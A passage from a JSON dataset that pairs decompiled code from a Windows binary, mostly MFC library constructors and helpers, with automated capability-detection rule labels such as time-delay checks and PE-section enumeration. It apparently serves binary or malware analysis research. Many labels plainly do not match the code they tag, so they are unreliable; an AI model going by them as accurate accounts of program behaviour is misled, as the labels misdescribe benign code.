(var_8h < 0) {\n                    return var_8h;\n                }\n                puVar1 = *(param_1 + 8);\n                (***puVar1)(puVar1, 0x494ec4, param_1 + 0xc);\n            }\n            else {\n                piVar2 = *(param_1 + 0x48);\n                var_8h = (**(*piVar2 + 0xc))(piVar2, 0, 0x496e34, param_1 + 0x4c);\n                if (*(param_1 + 0x4c) == 0) {\n                    var_8h = -0x7fffbffd;\n                }\n                if (var_8h < 0) {\n                    if (var_14h == 0) {\n                        return var_8h;\n                    }\n                    fcn.004226bf(var_24h, var_20h, var_1ch - var_24h, var_18h - var_20h, 0);\n                    fcn.004226fd(0);\n                    return var_8h;\n                }\n            }\n            iVar4 = fcn.004414ee();\n            if (var_14h != 0) {\n                fcn.004226bf(var_24h, var_20h, var_1ch - var_24h, var_18h - var_20h, 0);\n                fcn.004226fd(0);\n            }\n            return iVar4;\n        }\n    }\n    ppiStack76 = 0x4a8690;\n    puStack72 = &stack0xfffffffc;\n    fcn.00456b8d(&stack0xffffffb4, 0x49ed44);\n    pcVar3 = swi(3);\n    iVar4 = (*pcVar3)();\n    return iVar4;\n}\n",
        "token_count": 1237
    },
    "0044615d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0044615d(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint in_ECX;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = in_ECX;\n    if (arg_8h != NULL) goto code_r0x00446177;\n    do {\n        fcn.0041901a();\ncode_r0x00446177:\n    } while (*arg_8h == 0);\n    piVar1 = fcn.00430654();\n    if (piVar1 != NULL) {\n        var_14h = 0;\n        var_10h = 0;\n        var_ch = 0;\n        var_8h = 0;\n        iVar2 = (**(*piVar1 + 0x54))(0, 0, 0x50800000, &var_14h, var_4h, arg_ch, arg_8h);\n        if (iVar2 != 0) {\n            uVar3 = fcn.004225d2();\n            if ((uVar3 & 0x200) == 0) {\n                return piVar1;\n            }\n            fcn.00422616(0x200, 0, 0x20);\n            return piVar1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 338
    },
    "004471ae": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004471ae(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (in_ECX[0x32] == 0) {\n        uVar1 = in_ECX[0x34];\n        in_ECX[0x32] = 1;\n        if ((uVar1 & 4) != 0) {\n            arg_8h = 1;\n        }\n        in_ECX[0x34] = uVar1 & 0xfffffff3;\n        if ((arg_8h != 0) && (in_ECX[0x20] != NULL)) {\n            (**(*in_ECX[0x20] + 0x50))();\n        }\n        uVar1 = fcn.004225b8();\n        if ((uVar1 & 0x2000) == 0) {\n            fcn.0041ea72(0, 0xffff, 0xe900, 2, in_ECX + 0x1c, 0, 1);\n        }\n        else {\n            var_8h = 0x7fff;\n            var_4h = 0x7fff;\n            var_10h = 0;\n            var_ch = 0;\n            fcn.0041ea72(0, 0xffff, 0xe900, 1, &var_10h, &var_10h, 0);\n            fcn.0041ea72(0, 0xffff, 0xe900, 2, in_ECX + 0x1c, &var_10h, 1);\n            (**(*in_ECX + 0x68))(&var_10h, 0);\n            fcn.00422a19(0, 0, 0, var_8h - var_10h, var_4h - var_ch, 0x16);\n        }\n        in_ECX[0x32] = 0;\n    }\n    return;\n}\n",
        "token_count": 481
    },
    "0044bfae": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044bfae(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar6 = *(in_ECX + 0xac);\n    puVar1 = in_ECX + 0xb0;\n    uVar2 = *puVar1;\n    uVar3 = *(in_ECX + 0xb4);\n    uVar4 = *(in_ECX + 0xb8);\n    uVar5 = *(in_ECX + 0xbc);\n    *(in_ECX + 0xac) = *arg_ch == 0;\n    (*_sym.imp.USER32.dll_CopyRect)(puVar1, arg_ch + 1);\n    fcn.00452236(arg_8h, arg_ch);\n    *puVar1 = uVar2;\n    *(in_ECX + 0xb4) = uVar3;\n    *(in_ECX + 0xb8) = uVar4;\n    *(in_ECX + 0xbc) = uVar5;\n    *(in_ECX + 0xac) = uVar6;\n    return;\n}\n",
        "token_count": 305
    },
    "0044d2c8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0044d2c8(int32_t hgdiobj)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    uint lpvObject;\n    int32_t var_30h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.GDI32.dll_GetObjectA)(hgdiobj, 0x18, &lpvObject);\n    piVar1 = in_ECX + 0x27;\n    if (*piVar1 == 0) {\n        var_8h = 0;\n        var_4h = hgdiobj;\n        iVar2 = (**(*in_ECX + 0x110))(0x413, var_30h / in_ECX[0x29], &var_8h);\n        uVar3 = iVar2 == 0;\n    }\n    else {\n        var_ch = var_30h / in_ECX[0x29];\n        var_1ch = 0;\n        var_14h = 0;\n        var_10h = hgdiobj;\n        var_18h = *piVar1;\n        uVar3 = (**(*in_ECX + 0x110))(0x42e, 0, &var_1ch);\n    }\n    if (uVar3 != 0) {\n        fcn.00431dc6(piVar1);\n        *piVar1 = hgdiobj;\n    }\n    return uVar3;\n}\n",
        "token_count": 382
    },
    "0040fb80": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.0040fb80(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint unaff_retaddr;\n    \n    uVar1 = fcn.00419362(6);\n    fcn.00419e64(&param_1, param_1, param_2);\n    fcn.00419631(unaff_retaddr, param_1);\n    fcn.00419362(uVar1);\n    return;\n}\n",
        "token_count": 100
    },
    "00411810": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00411810(int32_t param_1, int32_t param_2)\n\n{\n    fcn.00402200(param_2);\n    fcn.00402200(param_2 + 4);\n    fcn.00402200(param_2 + 8);\n    fcn.00402200(param_2 + 0xc);\n    fcn.00402200(param_2 + 0x10);\n    *(param_1 + 0x14) = *(param_2 + 0x14);\n    *(param_1 + 0x18) = *(param_2 + 0x18);\n    return param_1;\n}\n",
        "token_count": 149
    },
    "00421f8e": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421f8e(code **param_1)\n\n{\n    *param_1 = vtable.CCmdUI.0;\n    param_1[8] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[9] = NULL;\n    param_1[4] = NULL;\n    param_1[3] = NULL;\n    param_1[5] = NULL;\n    param_1[7] = NULL;\n    param_1[6] = NULL;\n    return;\n}\n",
        "token_count": 127
    },
    "0042207c": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042207c(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0042b7b9();\n    *(param_1 + 0x1c) = uVar1;\n    *(param_1 + 4) = 1;\n    *(param_1 + 0x14) = 1;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x18) = 0;\n    return param_1;\n}\n",
        "token_count": 152
    },
    "00423bcd": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00423bcd(code **param_1, code *param_2)\n\n{\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[5] = NULL;\n    *param_1 = vtable.CStringList.0;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 104
    },
    "00425159": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.00425159(code **param_1)\n\n{\n    *param_1 = vtable.CCommandLineInfo.0;\n    fcn.004018d0();\n    fcn.004018d0();\n    fcn.004018d0();\n    fcn.004018d0();\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[1] = 0x1;\n    return param_1;\n}\n",
        "token_count": 118
    },
    "00425198": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425198(code **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    \n    *param_1 = vtable.CCommandLineInfo.0;\n    fcn.004010d0();\n    fcn.004010d0();\n    fcn.004010d0();\n    ppiVar3 = param_1[5] + -0x10;\n    piVar1 = param_1[5] + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar3 + 4))(ppiVar3);\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00425754": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.00425754(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = *(param_1 + 4);\n    if ((iVar1 == 0x200) || (iVar1 == 0xa0)) {\n        iVar1 = fcn.0042b206();\n        iVar2 = fcn.00425688(*(param_1 + 0x14), *(param_1 + 0x18));\n        if ((iVar2 == 0) || (*(param_1 + 4) != *(iVar1 + 0x54))) {\n            *(iVar1 + 0x4c) = *(param_1 + 0x14);\n            *(iVar1 + 0x50) = *(param_1 + 0x18);\n            *(iVar1 + 0x54) = *(param_1 + 4);\n            uVar3 = 1;\n        }\n        else {\n            uVar3 = 0;\n        }\n        return uVar3;\n    }\n    if ((iVar1 != 0xf) && (iVar1 != 0x118)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 269
    },
    "0042b62b": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042b62b(uint arg_8h)\n\n{\n    uchar uVar1;\n    uint *puVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00458e78(0xc);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *extraout_ECX = vtable.AFX_MODULE_STATE.0;\n    extraout_ECX[7] = NULL;\n    extraout_ECX[8] = NULL;\n    extraout_ECX[9] = NULL;\n    extraout_ECX[10] = NULL;\n    fcn.004018d0();\n    extraout_ECX[0x10] = NULL;\n    extraout_ECX[0x11] = NULL;\n    extraout_ECX[0x14] = 0xffffffff;\n    *(unaff_EBP + -4) = 0;\n    extraout_ECX[0x15] = NULL;\n    extraout_ECX[0x1a] = NULL;\n    extraout_ECX[0x1b] = NULL;\n    uVar1 = *(unaff_EBP + 8);\n    extraout_ECX[10] = 0x20;\n    extraout_ECX[8] = 0x14;\n    extraout_ECX[6] = NULL;\n    *(extraout_ECX + 5) = uVar1;\n    *(unaff_EBP + -4) = 2;\n    fcn.00401940(0x1000);\n    *(unaff_EBP + -4) = 1;\n    extraout_ECX[0xc] = 0x1;\n    extraout_ECX[0x11] = 0x18;\n    pcVar3 = fcn.004170b4(8);\n    extraout_ECX[0x1e] = pcVar3;\n    iVar4 = fcn.00430f5c(0x188);\n    *(unaff_EBP + 8) = iVar4;\n    *(unaff_EBP + -4) = 4;\n    if (iVar4 == 0) {\n        uVar5 = 0;\n    }\n    else {\n        uVar5 = fcn.0042b344();\n    }\n    puVar2 = extraout_ECX[0x1e];\n    *(unaff_EBP + -4) = 1;\n    *puVar2 = uVar5;\n    iVar4 = fcn.00430f5c(100);\n    *(unaff_EBP + 8) = iVar4;\n    *(unaff_EBP + -4) = 5;\n    if (iVar4 == 0) {\n        uVar5 = 0;\n    }\n    else {\n        uVar5 = fcn.0042b588();\n    }\n    *(extraout_ECX[0x1e] + 4) = uVar5;\n    extraout_ECX[0x1f] = 0x1;\n    extraout_ECX[0x20] = NULL;\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 734
    },
    "004318c8": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004318c8(code **param_1, code *param_2)\n\n{\n    *param_1 = vtable.CMapPtrToPtr.0;\n    if (param_2 < 1) {\n        param_2 = 0xa;\n    }\n    param_1[1] = NULL;\n    param_1[2] = 0x11;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 132
    },
    "004319cf": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004319cf(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    pcVar1 = *(unaff_EBP + 8);\n    *extraout_ECX = vtable.CHandleMap.0;\n    fcn.004445ae(*(pcVar1 + 4), 0x40);\n    *(unaff_EBP + -4) = 0;\n    fcn.004318c8(10);\n    *(unaff_EBP + -4) = 1;\n    fcn.004318c8(4);\n    iVar2 = 0;\n    *(unaff_EBP + -4) = 2;\n    if (*(unaff_EBP + 0xc) != 0) goto code_r0x00431a24;\n    do {\n        iVar2 = fcn.0041901a();\ncode_r0x00431a24:\n    } while (*(unaff_EBP + 0x10) == iVar2);\n    fcn.004316c7(7, iVar2);\n    extraout_ECX[5] = *(unaff_EBP + 0xc);\n    extraout_ECX[6] = *(unaff_EBP + 0x10);\n    extraout_ECX[0x16] = *(unaff_EBP + 0x14);\n    extraout_ECX[0x17] = *(unaff_EBP + 0x18);\n    extraout_ECX[0x15] = pcVar1;\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 460
    },
    "00432450": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00432450(code **param_1, code *param_2)\n\n{\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[5] = NULL;\n    *param_1 = vtable.CPtrList.0;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 104
    },
    "0043c605": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043c605(uint *param_1, uint param_2, uint param_3)\n\n{\n    param_1[8] = param_2;\n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    param_1[3] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[9] = param_3;\n    param_1[4] = 0;\n    return;\n}\n",
        "token_count": 132
    },
    "0043c62e": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043c62e(int32_t param_1)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = _sym.imp.ole32.dll_CoTaskMemFree;\n    (*_sym.imp.ole32.dll_CoTaskMemFree)(*(param_1 + 0x14));\n    *(param_1 + 0x14) = 0;\n    (*pcVar1)(*(param_1 + 0x18));\n    *(param_1 + 0x18) = 0;\n    fcn.004170df(*(param_1 + 8));\n    *(param_1 + 8) = 0;\n    fcn.004170df(*(param_1 + 0x10));\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0xc) = 0;\n    return;\n}\n",
        "token_count": 195
    },
    "0043d6e0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.0043d6e0(code **param_1, code *param_2)\n\n{\n    *param_1 = vtable.CDataSourceControl.0;\n    param_1[1] = param_2;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    fcn.00432450(10);\n    param_1[0xd] = NULL;\n    param_1[0xe] = NULL;\n    param_1[0xf] = NULL;\n    param_1[0x10] = NULL;\n    param_1[0x11] = NULL;\n    param_1[0x12] = NULL;\n    param_1[0x13] = NULL;\n    param_1[0x14] = NULL;\n    param_1[0x15] = NULL;\n    param_1[0x16] = NULL;\n    return param_1;\n}\n",
        "token_count": 228
    },
    "0043d8c3": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043d8c3(uint *param_1, uint param_2, uint param_3, ushort param_4)\n\n{\n    *param_1 = 0;\n    *(param_1 + 1) = param_4;\n    param_1[3] = 0;\n    param_1[5] = 0;\n    param_1[2] = param_3;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 109
    },
    "0043e040": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0043e040(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t arg_28h, int32_t arg_2ch, uint arg_30h, uint arg_34h, uint arg_38h)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    \n    iVar1 = 0;\n    if (arg_8h == NULL) {\n        arg_8h = fcn.00401070(0x80004005);\n        iVar1 = extraout_ECX;\n    }\n    arg_8h[8] = arg_34h;\n    arg_8h[5] = arg_30h;\n    arg_8h[9] = arg_20h;\n    *arg_8h = arg_ch;\n    *(arg_8h + 0xc) = arg_10h;\n    *(arg_8h + 0x32) = arg_18h;\n    *(arg_8h + 0x33) = arg_1ch;\n    arg_8h[0xb] = iVar1;\n    arg_8h[1] = iVar1;\n    arg_8h[2] = iVar1;\n    arg_8h[3] = iVar1;\n    arg_8h[4] = iVar1;\n    arg_8h[6] = iVar1;\n    arg_8h[10] = arg_14h;\n    arg_8h[7] = iVar1;\n    if (arg_38h == iVar1) {\n        arg_8h[7] = 1;\n        arg_8h[1] = arg_24h;\n    }\n    if (arg_28h != iVar1) {\n        arg_8h[7] = arg_8h[7] | 2;\n        arg_8h[2] = arg_28h;\n    }\n    if (arg_2ch != iVar1) {\n        arg_8h[7] = arg_8h[7] | 4;\n        arg_8h[3] = arg_2ch;\n    }\n    return;\n}\n",
        "token_count": 504
    },
    "00443c84": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00443c84(code **param_1, code *param_2)\n\n{\n    fcn.0043992e();\n    param_1[4] = param_2;\n    param_1[5] = NULL;\n    param_1[6] = NULL;\n    param_1[7] = NULL;\n    param_1[8] = NULL;\n    *param_1 = vtable.CMemFile.0;\n    param_1[9] = 0x1;\n    return param_1;\n}\n",
        "token_count": 121
    },
    "00443cb4": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00443cb4(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    code *extraout_ECX_00;\n    code *pcVar2;\n    code *extraout_EDX;\n    code *pcVar3;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.0043992e();\n    pcVar3 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    pcVar2 = *(unaff_EBP + 0xc);\n    *extraout_ECX = vtable.CMemFile.0;\n    if ((pcVar3 == NULL) && (pcVar2 != NULL)) {\n        fcn.0041901a();\n        pcVar2 = extraout_ECX_00;\n        pcVar3 = extraout_EDX;\n    }\n    pcVar1 = *(unaff_EBP + 0x10);\n    extraout_ECX[5] = NULL;\n    extraout_ECX[4] = pcVar1;\n    extraout_ECX[9] = NULL;\n    extraout_ECX[7] = ~-(pcVar1 != NULL) & pcVar2;\n    extraout_ECX[6] = pcVar2;\n    extraout_ECX[8] = pcVar3;\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 359
    },
    "00443f52": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443f52(int32_t *param_1)\n\n{\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    if ((param_1[8] != 0) && (param_1[9] != 0)) {\n        (**(*param_1 + 0x60))(param_1[8]);\n    }\n    param_1[8] = 0;\n    return;\n}\n",
        "token_count": 125
    },
    "00444069": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.00444069(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CMemFile.0;\n    pcVar1 = extraout_ECX[8];\n    *(unaff_EBP + -4) = 0;\n    if (pcVar1 != NULL) {\n        fcn.00443f52();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    extraout_ECX[4] = NULL;\n    extraout_ECX[5] = NULL;\n    extraout_ECX[6] = NULL;\n    extraout_ECX[7] = NULL;\n    fcn.00439b0d();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 224
    },
    "00447491": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00447491(code **param_1, code *param_2)\n\n{\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[5] = NULL;\n    *param_1 = vtable.CList_struct_HWND_____struct_HWND____.0;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 111
    },
    "00449af3": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449af3(code **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    \n    *param_1 = vtable.COleDispatchException.0;\n    fcn.004010d0();\n    fcn.004010d0();\n    ppiVar3 = param_1[3] + -0x10;\n    piVar1 = param_1[3] + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar3 + 4))(ppiVar3);\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "0044f8a1": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.0044f8a1(code **param_1, code **param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    \n    *param_1 = vtable.COleControlLock.0;\n    param_1[6] = NULL;\n    param_1[1] = *param_2;\n    param_1[2] = param_2[1];\n    param_1[3] = param_2[2];\n    param_1[4] = param_2[3];\n    ppiVar1 = param_1 + 5;\n    *ppiVar1 = NULL;\n    iVar2 = fcn.0042b206();\n    if ((*(iVar2 + 0x100) == 0) && (iVar2 = fcn.0044b728(),  iVar2 == 0)) {\n        return param_1;\n    }\n    iVar2 = (*_sym.imp.ole32.dll_CoGetClassObject)(param_2, 3, 0, 0x496584, ppiVar1);\n    if ((-1 < iVar2) && (iVar2 = (**(**ppiVar1 + 0x10))(*ppiVar1, 1),  iVar2 < 0)) {\n        (**(**ppiVar1 + 8))(*ppiVar1);\n        *ppiVar1 = NULL;\n    }\n    return param_1;\n}\n",
        "token_count": 315
    },
    "0045087a": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045087a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    \n    iVar1 = fcn.004176d0(arg_10h, arg_8h, &var_14h);\n    *(iVar1 + 0x10) = 1;\n    iVar1 = fcn.004507c7(iVar1, 1);\n    *(iVar1 + 0x1c) = 0;\n    *(iVar1 + 0x14) = 1;\n    *(iVar1 + 0x18) = arg_ch;\n    return;\n}\n",
        "token_count": 149
    },
    "004508f5": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004508f5(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    \n    iVar1 = fcn.004176d0(arg_ch, arg_8h, &var_14h);\n    *(iVar1 + 0x10) = 5;\n    iVar1 = fcn.004507c7(iVar1, 1);\n    *(iVar1 + 0x14) = 0;\n    *(iVar1 + 0x18) = 0;\n    *(iVar1 + 0x1c) = 0;\n    return;\n}\n",
        "token_count": 141
    },
    "0045097d": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045097d(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_14h;\n    \n    uVar1 = fcn.004176d0(arg_ch, arg_8h, &var_14h);\n    iVar2 = fcn.004507c7(uVar1, 2);\n    *(iVar2 + 0x14) = 0;\n    *(iVar2 + 0x18) = 0;\n    *(iVar2 + 0x1c) = 0;\n    return;\n}\n",
        "token_count": 134
    },
    "0045397e": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0045397e(code **param_1, code *param_2)\n\n{\n    *param_1 = vtable.CMapStringToPtr.0;\n    if (param_2 < 1) {\n        param_2 = 0xa;\n    }\n    param_1[1] = NULL;\n    param_1[2] = 0x11;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 132
    },
    "00418fbd": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418fbd(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *(param_1 + 0xc) = 1;\n    iVar1 = fcn.00424172(*(param_1 + 0x94), param_1 + 0x14, 0x80);\n    *(param_1 + 0x10) = iVar1 != 0;\n    return;\n}\n",
        "token_count": 97
    },
    "0041a439": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041a439(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    extraout_ECX[1] = NULL;\n    extraout_ECX[2] = NULL;\n    extraout_ECX[3] = NULL;\n    *(unaff_EBP + -4) = 0;\n    iVar3 = *(unaff_EBP + 8);\n    *extraout_ECX = vtable.CPaintDC.0;\n    pcVar1 = *(iVar3 + 0x20);\n    extraout_ECX[4] = pcVar1;\n    uVar2 = (*_sym.imp.USER32.dll_BeginPaint)(pcVar1, extraout_ECX + 5);\n    iVar3 = fcn.0041a288(uVar2);\n    if (iVar3 == 0) {\n        fcn.004198b5();\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 294
    },
    "00420246": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
